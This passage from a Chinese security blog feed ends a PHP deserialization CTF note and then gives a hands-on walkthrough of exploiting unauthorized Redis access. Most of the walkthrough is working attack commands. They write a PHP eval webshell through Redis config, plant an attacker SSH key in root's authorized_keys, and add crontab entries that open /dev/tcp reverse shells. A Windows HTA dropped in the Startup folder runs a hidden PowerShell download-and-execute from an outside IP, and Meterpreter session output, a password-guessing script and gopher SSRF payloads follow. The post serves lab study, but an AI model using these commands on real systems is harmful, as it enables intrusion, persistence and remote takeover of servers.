class="string">&#x27;hostname&#x27;</span>] = <span class="string">&#x27;127.0.0.1&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>seay扫了一下</p><p><img src="E:/sECRET/hexo/blog/source/_posts/image-20210824201836505.png" alt="image-20210824201836505"></p><p>这里将上传的文件<code>$profile[&#39;photo&#39;]</code>中的内容读取后进行<code>base64</code>，然后输出，那么思路就很明确了：上面还有个反序列化<code>unserialize</code>，感觉有戏，如果让 <code>$profile[&#39;photo&#39;]</code>的值为<code>&#39;config.php&#39;</code>，这样就可以将<code>config.php</code>的源码经过base64编码后输出，就可以得到flag了。可以对<code>photo</code>进行操作的地方在<code>update.php</code>，有phone、email、nickname和photo这几个</p><p>那自然就是反序列化逃逸的事了    </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$profile = &#x27;a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678901&quot;;s:5:&quot;email&quot;;s:8:&quot;ss@q.com&quot;;s:8:&quot;nickname&quot;;s:8:&quot;sea_sand&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:39:&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;;&#125;&#x27;;</span><br><span class="line">print_r(unserialize($profile));</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line"> [phone] =&gt; 12345678901</span><br><span class="line"> [email] =&gt; ss@q.com</span><br><span class="line"> [nickname] =&gt; sea_sand</span><br><span class="line"> [photo] =&gt; config.php</span><br><span class="line">)</span><br></pre></td></tr></table></figure><blockquote><p>本地想运行连不上数据库       慢慢研究  8  看别人wp去了</p></blockquote><p><a href="https://blog.csdn.net/qq_45521281/article/details/107135706">https://blog.csdn.net/qq_45521281/article/details/107135706</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis未授权复现与利用</title>
      <link href="/2021/08/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
      <url>/2021/08/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a><strong>Redis</strong></h1><p>REmote DIctionary Server(Redis) 是完全开源免费的，遵守BSD协议，Redis是一个由Salvatore Sanfilippo写的key-value存储系统。。</p><p> Redis 与其他它key - value 缓存产品有以下三个特点：</p><ul><li><p>Redis支持数据的持久化，可以将内存中的数据保存在磁盘中，重启的时候可以再次加载进行使用。</p></li><li><p>Redis不仅仅支持简单的key-value类型的数据，同时还提供list，set，zset，hash等数据结构的存储。</p></li><li><p>Redis支持数据的备份，即master-slave模式的数据备份。</p><span id="more"></span></li></ul><p>　　Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p><p>漏洞的产生条件有以下两点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；</span><br><span class="line">（2）没有设置密码认证（一般为空），可以免密码远程登录redis服务。 </span><br></pre></td></tr></table></figure><p>漏洞的危害</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据；</span><br><span class="line">（2）攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件；</span><br><span class="line">（3）最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器</span><br></pre></td></tr></table></figure><p><strong>复现过程</strong></p><p>配置 </p><p>攻击端A centos </p><p>靶机B centos</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1）解压安装包：tar xzf redis-2.8.17.tar.gz进入redis目录：cd redis-2.8.17安装：make</span><br><span class="line">2）make结束后，进入src目录：cd src，</span><br><span class="line">将redis-server和redis-cli拷贝到/usr/bin目录下（这样启动redis-server和redis-cli就不用每次都进入安装目录了）</span><br><span class="line">3）返回目录redis-2.8.17，将redis.conf拷贝到/etc/目录下：</span><br><span class="line">cp redis.conf /etc/</span><br><span class="line">4）使用/etc/目录下的reids.conf文件中的配置启动redis服务：</span><br><span class="line">redis-server /etc/redis.conf</span><br><span class="line">服务启动成功，我们克隆这台虚拟机</span><br><span class="line">一台作为攻击机192.168.43.99</span><br><span class="line">一台作为靶机192.168.43.159</span><br><span class="line">启动redis服务进程后，就可以使用测试攻击机程序redis-cli和靶机的redis服务交互了</span><br><span class="line">关闭redis-cli -h 127.0.0.1 -p 6379 shutdown</span><br><span class="line">启动redis-server</span><br></pre></td></tr></table></figure><p>靶机启动redis后可以使用netstat -ntlp 查看是否开启了6379端口</p><p><img src="image-20210818163735678.png" alt="image-20210818163735678"></p><p>一般的话也可以用nmap</p><p><code>nmap -A -p 6379 -script redis-info 192.168.43.159</code></p><p><img src="image-20210818164007034.png" alt="image-20210818164007034"></p><p><code>./redis-cli -h 192.168.43.159</code></p><p>过程中 如果遇到 <code>No route to host</code></p><p><img src="E:/机密文件/hexo/blog/source/_posts/Redis未授权访问漏洞复现与利用/image-20210818163444178.png" alt="image-20210818163444178"></p><p>关闭防火墙<code>systemctl stop firewalld.service</code></p><p>可以<code>iptables -F</code> #删除过滤规则，不建议</p><p>后来发现也可以<code>firewall-cmd --zone=public --add-port=6379/tcp --permanent</code>开启6379端口然后重启</p><p><code>firewall-cmd --reload    </code></p><p>果然是防火墙的问题<br>可是真正的攻击 对方肯定不会关防火墙的<br>这里只是对 redis 未授权进行复现所以不考虑那么多</p><p><img src="image-20210818163530557.png" alt="image-20210818163530557"></p><p><img src="image-20210818163503309.png" alt="image-20210818163503309"></p><p>1)查看敏感信息</p><p><code>192.168.43.159:6379&gt;info</code></p><p><img src="image-20210818164146071.png" alt="image-20210818164146071"></p><p> 2）查看key和对应的值</p><p><code>keys *</code></p><p><img src="image-20210818184823879.png" alt="image-20210818184823879"></p><h1 id="SSH写入一句话木马"><a href="#SSH写入一句话木马" class="headerlink" title="SSH写入一句话木马"></a>SSH写入一句话木马</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.靶机redis链接未授权，在攻击机上能用redis-cli连上，并未登陆验证 </span><br><span class="line">2.开了web服务器，并且知道路径（如利用phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限 （我们可以将dir设置为一个目录a，而dbfilename为文件名b，再执行save或bgsave，则我们就可以写入一个路径为a/b的任意文件。）</span><br></pre></td></tr></table></figure><p>靶机在 /var/www/html/uploads这个目录下。<br>执行下列命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.5.135</span><br><span class="line">config set dir  /var/www/html/uploads</span><br><span class="line">config set dbfilename 1.php</span><br><span class="line">set x &quot;\r\n\r\n&lt;?php @eval($_POST[&#x27;c&#x27;]);?&gt;\r\n\r\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>当数据库过大时，redis写shell的小技巧：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">set_time_limit(0);</span><br><span class="line">$fp=fopen(&#x27;bmjoker.php&#x27;,&#x27;w&#x27;);</span><br><span class="line">fwrite($fp,&#x27;&lt;?php @eval($_POST[\&quot;bmjoker\&quot;]);?&gt;&#x27;);</span><br><span class="line">exit();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="image-20210818190426780.png" alt="image-20210818190426780"></p><p>由于我的靶机上没网站，所以这里就贴个别人的图片记录一下</p><p><img src="image-20210818185926772.png" alt="image-20210818185926772"></p><p>低权也可尝试利用phpinfo的信息和默认路径操作</p><h1 id="SSH免密码登录"><a href="#SSH免密码登录" class="headerlink" title="SSH免密码登录"></a>SSH免密码登录</h1><p><code>当redis以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH登录目标服务器。</code></p><p>靶机B创建.ssh文件夹</p><p><code>mkdir /root/.ssh</code></p><p>攻击机A</p><p>生成秘钥 密码设置为空</p><p><code>ssh-keygen -t rsa</code></p><p><img src="image-20210818164621282.png" alt="image-20210818164621282"></p><p>方法一：</p><p>进入.ssh目录：cd .ssh/，将生成的公钥保存到key.txt：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>; cat id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">&quot;\n\n&quot;</span>)&gt;key.txt</span><br></pre></td></tr></table></figure><p><img src="image-20210818164748446.png" alt="image-20210818164748446"></p><p>将key.txt写入redis（使用redis-cli -h ip命令连接主机A，将文件写入）</p><p><code>cat key.txt |redis-cli -h 192.168.43.159 -x set crack</code></p><p><img src="image-20210818165147458.png" alt="image-20210818165147458"></p><p>远程登录主机A的redis服务：redis-cli -h 192.168.0.146 并使用CONFIG GET dir命令得到redis备份的路径</p><p><code>config get dir</code></p><p>更改redis备份路径为ssh公钥存放目录（一般默认为/root/.ssh）</p><p><code>config set dir /root/.ssh</code></p><p>设置上传公钥的备份文件名字为authorized_keys</p><p><code>onfig set dbfilename authorized_keys</code></p><p>检查是否更改成功（查看有没有authorized_keys文件），没有问题就保存然后退出，至此成功写入ssh公钥到靶机</p><p><code>config get dbfilename</code></p><p>可以在 靶机B /root/.ssh 目录下查看 authorized_keys</p><p><img src="image-20210818165320501.png" alt="image-20210818165320501"></p><p>方法二：</p><p>生成公钥私钥<br>  <code>ssh-keygen -t rsa</code><br>  一路回车</p><p>攻击机操作靶机Redis</p><p>指定目录<br><code>config set dir /root/.ssh</code><br>指定文件名<br><code>config set dbfilename authorized_keys</code><br>设置公钥内容<br><code>set x &quot;\n\n\nssh-rsaaAAAAB3NzaC1yc2EAAAADAQABAAABAQDET52Uo7NcYs0eSlt0MHrvxBUVVcN52Lr22MRwQdEu4gbqLEKn717BreUu2Vj+4x9Rsveip4aWMxddwbQgrHu7ILVqQSekkn8iUCNpq+oMAjZDnfOhkfLWZZKbrs/stb9FJ/uyOy0vXb9A5xIGdSBS8lBO0xiJc/EohNAr6eyF/U652Ir3yLvnFBWAQwg5ptoYY4JOsy8VcTbYvEV4IIFnPVMVF+IXitLczsVhCEVcNS3yl4dt6wbmRJwE+yVUMyUcFTSInOhkDCAoDsf4E6Cmbrme4yciUdVSHJrRtx8f216Ww4BL325oARE7OS0oefGQbQd6VSGa3Sdm4sYBdwoH 1@localhost.localdomain\n\n\n&quot;</code><br>保存</p><p><code>save</code></p><p>开启 ssh 服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service ssh start</span><br></pre></td></tr></table></figure><p><code>ssh -i id_rsa 192.168.43.159</code></p><p>ssh 未授权登录成功</p><p>方法一的</p><p><img src="image-20210818184700453.png" alt="image-20210818184700453"></p><p>方法二的</p><p><img src="image-20210818173430077.png" alt="image-20210818173430077"></p><p><img src="image-20210818174116364.png" alt="image-20210818174116364"></p><p>看到确实ip是靶机的，</p><h1 id="利用crontab反弹shell"><a href="#利用crontab反弹shell" class="headerlink" title="利用crontab反弹shell"></a>利用crontab反弹shell</h1><p>在<strong>权限足够的情况</strong>下，利用redis写入文件到计划任务目录下执行。</p><p>攻击端监听一个端口</p><p>nc -lvnp 4444</p><p>连接redis，写入反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.43.159 set xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.43.159/4444 0&gt;&amp;1\n\n&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">config set dir /var/spool/cron </span><br><span class="line"></span><br><span class="line">config set dbfilename root </span><br><span class="line"></span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>过一分钟左右就可以收到shell</p><p>利用crontab反弹shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">redis-cli flushall </span><br><span class="line">echo -e &quot;nn*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/114.114.114.114/53 0&gt;&amp;1nn&quot;|redis-cli -x set 1 </span><br><span class="line">redis-cli config set dir /var/spool/cron/ </span><br><span class="line">redis-cli config set dbfilename root </span><br><span class="line">redis-cli save</span><br></pre></td></tr></table></figure><p>利用crontab创建文件 /tmp/888</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">redis-cli flushall # 为了方便测试 </span><br><span class="line">redis-cli set test &#x27;test&#x27; </span><br><span class="line">redis-cli set my &#x27;mymymymymymymymymymymymy&#x27; </span><br><span class="line">redis-cli set word &#x27;wordwordwordwordwordword&#x27; </span><br><span class="line">redis-cli set hello &#x27;ringzero&#x27; </span><br><span class="line">redis-cli set word1 &#x27;word1word1word1word1word1word1&#x27; </span><br><span class="line">echo -e &quot;nn*/1 * * * * /bin/touch /tmp/888nn&quot;|redis-cli -x set 1 </span><br><span class="line">redis-cli config set dir /var/spool/cron/ </span><br><span class="line">redis-cli config set dbfilename root </span><br><span class="line">redis-cli save</span><br><span class="line">redis-cli flushall </span><br><span class="line">echo -e &quot;nn*/1 * * * * /bin/touch /tmp/888nn&quot;|redis-cli -x set 1 </span><br><span class="line">redis-cli config set dir /var/spool/cron/ </span><br><span class="line">redis-cli config set dbfilename root </span><br><span class="line">redis-cli save</span><br></pre></td></tr></table></figure><p>二次改写crontab</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">redis-cli flushall </span><br><span class="line">redis-cli set 2 &#x27;;a=`redis-cli get c`;&#x27; </span><br><span class="line">redis-cli set 1 &#x27;id;redis-cli set r `$a`;#&#x27; </span><br><span class="line">redis-cli config set dir /tmp/ </span><br><span class="line">redis-cli config set dbfilename w </span><br><span class="line">redis-cli save </span><br><span class="line">redis-cli set c whoami</span><br></pre></td></tr></table></figure><p>利用第一步的写crontab步骤，完成下面的命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot; &quot; &gt; /tmp/zz </span><br><span class="line">cat /tmp/w &gt;&gt; /tmp/zz </span><br><span class="line">/bin/sh /tmp/zz </span><br><span class="line">redis-cli get r</span><br></pre></td></tr></table></figure><p>控制 /var/spool/cron/root 和 /tmp/zz</p><p> 最终实现，每10秒从redis的c变量读入要执行的命令，再将执行结果写入变量r</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * sleep 10;/bin/sh /tmp/zz</span><br></pre></td></tr></table></figure><p>windows利用方式（转自90sec）</p><p><strong>redis</strong> 官方未发布windows版本，但是野外存在redis/win版本。</p><p>在测试时发现一windows版本redis，遂开始搞。</p><p>直接上利用，基于msf:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@weisuo.org:~# cat hta-psh.txt </span><br><span class="line"> &lt;scRipt language=&quot;VBscRipT&quot;&gt;CreateObject(&quot;WscrIpt.SheLL&quot;).Run &quot;powershell -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString(&#x27;http://119.91.129.12:8080/1.ps1&#x27;)&quot;&lt;/scRipt&gt;</span><br><span class="line">[url=mailto:root@weisuo.org]root@weisuo.org[/url]:~#  cat hta-psh.txt |redis-cli -x -h 192.168.138.27 set a</span><br><span class="line">OK</span><br></pre></td></tr></table></figure><p>hta-psh.txt 对一些字符串进行变通，如不，在写入时会导致字符串丢失。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#msfconsole </span><br><span class="line">use payload/windows/meterpreter/reverse_tcp</span><br><span class="line">generate -t hta-psh -f /var/www/1.ps1</span><br><span class="line">#之后起个handle，略</span><br></pre></td></tr></table></figure><p>修改1.ps1，文件内容大概如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$command=”powershell -nop -w hidden -e xxxxxxxxxxxxxxxx”;iex $command;$command2=”taskkill /im mshta.exe”;iex $command2;</span><br></pre></td></tr></table></figure><p>最后写入文件，等待管理员登陆</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">oot@weisuo.org:~# redis-cli -h 192.168.138.27</span><br><span class="line">redis 192.168.138.27:6379&gt; CONFIG GET dir</span><br><span class="line">1) &quot;dir&quot;</span><br><span class="line">2) &quot;C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup&quot;</span><br><span class="line">redis 192.168.138.27:6379&gt; config get dbfilename</span><br><span class="line">1) &quot;dbfilename&quot;</span><br><span class="line">2) &quot;2.hta&quot;</span><br><span class="line">redis 192.168.138.27:6379&gt; save</span><br><span class="line">OK</span><br><span class="line">redis 192.168.138.27:6379&gt;[/p][p=20, null, left]</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(handler) &gt; rexploit -j -z</span><br><span class="line">[*] Stopping existing job...</span><br><span class="line">[*] Reloading module...</span><br><span class="line">[*] Exploit running as background job.</span><br><span class="line"> </span><br><span class="line">[*] Started reverse TCP handler on 119.91.151.22:80</span><br><span class="line">msf exploit(handler) &gt; [*] Starting the payload handler...</span><br><span class="line">[*] Sending stage (957999 bytes) to 60.111.27.14</span><br><span class="line">[*] Meterpreter session 4 opened (119.91.151.22:80 -&gt; 60.191.37.34:56301) at 2016-06-06 11:06:00 -0400</span><br><span class="line">[*] Session ID 4 (119.91.151.22:80 -&gt; 60.111.27.14:56301) processing AutoRunScript &#x27;migrate -f&#x27;</span><br><span class="line">[*] Current server process: powershell.exe (4896)</span><br><span class="line">[*] Spawning notepad.exe process to migrate to</span><br><span class="line">[+] Migrating to 3768</span><br><span class="line">[+] Successfully migrated to process</span><br></pre></td></tr></table></figure><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><p><strong>redis主从复制rce</strong><br>　　Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p><p>　　在Redis 4.x之后，Redis新增了模块功能，通过外部拓展，可以在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。编写恶意so文件的代码 <a href="https://github.com/RicterZ/RedisModules-ExecuteCommand">https://github.com/RicterZ/RedisModules-ExecuteCommand</a></p><p>　　在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载so文件，我们就可以执行拓展的新命令了。</p><p>网上收集两个比较方便的getshell python脚本</p><p>1.<a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p><p><img src="image-20210818200257389.png" alt="image-20210818200257389"></p><p>2.<a href="https://github.com/Ridter/redis-rce">https://github.com/Ridter/redis-rce</a></p><p><img src="image-20210818200323923.png" alt="image-20210818200323923"></p><p><img src="image-20210818200341465.png" alt="image-20210818200341465"></p><p>3.脚本</p><p>可用来测试是否存在未授权或弱口令的情况：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># _*_  coding:utf-8 _*_</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">PASSWORD_DIC=[<span class="string">&#x27;redis&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;oracle&#x27;</span>,<span class="string">&#x27;password&#x27;</span>,<span class="string">&#x27;p@aaw0rd&#x27;</span>,<span class="string">&#x27;abc123!&#x27;</span>,<span class="string">&#x27;123456&#x27;</span>,<span class="string">&#x27;admin&#x27;</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">ip, port, timeout</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        socket.setdefaulttimeout(timeout)</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((ip, <span class="built_in">int</span>(port)))</span><br><span class="line">        s.send(<span class="string">&quot;INFO\r\n&quot;</span>)</span><br><span class="line">        result = s.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;redis_version&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">u&quot;未授权访问&quot;</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;Authentication&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="keyword">for</span> pass_ <span class="keyword">in</span> PASSWORD_DIC:</span><br><span class="line">                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                s.connect((ip, <span class="built_in">int</span>(port)))</span><br><span class="line">                s.send(<span class="string">&quot;AUTH %s\r\n&quot;</span> %(pass_))</span><br><span class="line">                result = s.recv(<span class="number">1024</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;+OK&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">u&quot;存在弱口令，密码：%s&quot;</span> % (pass_)</span><br><span class="line">    <span class="keyword">except</span> Exception, e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ip=sys.argv[<span class="number">1</span>]</span><br><span class="line">    port=sys.argv[<span class="number">2</span>]</span><br><span class="line">    <span class="built_in">print</span> check(ip,port, timeout=<span class="number">10</span>)</span><br></pre></td></tr></table></figure><h1 id="SSRF相关"><a href="#SSRF相关" class="headerlink" title="SSRF相关"></a>SSRF相关</h1><p><strong>ssrf，redis与gopher</strong></p><p>如果通过ssrf探测到内网某ip开启了6379端口，并存在未授权，如何结合gopher协议来写shell。</p><p>gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，gopher是Internet上最主要的信息检索工具，gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；</p><p>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议</p><p>gopher协议格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br><span class="line">gopher的默认端口是70</span><br></pre></td></tr></table></figure><p>如果发起post请求，回车换行需要使用%0d%0a，如果存在多个参数，参数之间的&amp;也需要进行URL编码。注意%0d%0a是\r\n的URL编码。</p><p>gopher发送请求HTTP GET请求:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://192.168.194.1:6666/_abcd</span><br></pre></td></tr></table></figure><p>注意：abcd是要传递的数据，_会被吃掉不会传递过去</p><p>由于gopher协议规则比较复杂，这里借助一个github的工具来生成payload：<a href="https://github.com/firebroo/sec_tools">https://github.com/firebroo/sec_tools</a></p><p>只需要在redis-over-gopher/redis.cmd中写入redis执行的命令，比如下面的命令直接在web目录下写shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flushall</span><br><span class="line">config set dir /tmp</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set &#x27;webshell&#x27; &#x27;&lt;?php phpinfo();?&gt;&#x27;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>编辑好后运行redis-over-gopher/redis-over-gopher.py</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python redis-over-gopher.py</span><br></pre></td></tr></table></figure><p>就可以生成支持gopher协议的payload：</p><p><img src="1344396-20210102184648153-1395513140.png" alt="img"></p><p>使用curl运行payload</p><p><a href="https://img2020.cnblogs.com/blog/1344396/202101/1344396-20210102184706456-696764708.png"><img src="1344396-20210102184706456-696764708.png" alt="img"></a></p><p>进入docker容器，发现shell.php已经成功生成</p><p><a href="https://img2020.cnblogs.com/blog/1344396/202101/1344396-20210102184639299-51740366.png"><img src="1344396-20210102184639299-51740366.png" 